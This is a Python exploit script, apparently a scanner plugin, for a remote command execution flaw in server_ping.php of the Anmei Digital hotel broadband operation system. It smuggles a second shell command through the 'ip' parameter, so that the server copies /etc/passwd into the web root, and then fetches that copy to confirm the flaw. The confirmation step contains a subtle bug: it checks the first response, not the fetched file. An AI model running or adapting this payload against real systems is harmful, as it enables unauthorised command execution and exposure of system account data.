#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '安美数字 酒店宽带运营系统 server_ping.php 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Content-Type": "application/x-www-form-urlencoded",
      }
  target = '/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "parent" in res.text:
      resp = requests.get(url=url+'/test.txt',headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and 'root:' in res.text:
        res.close()
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret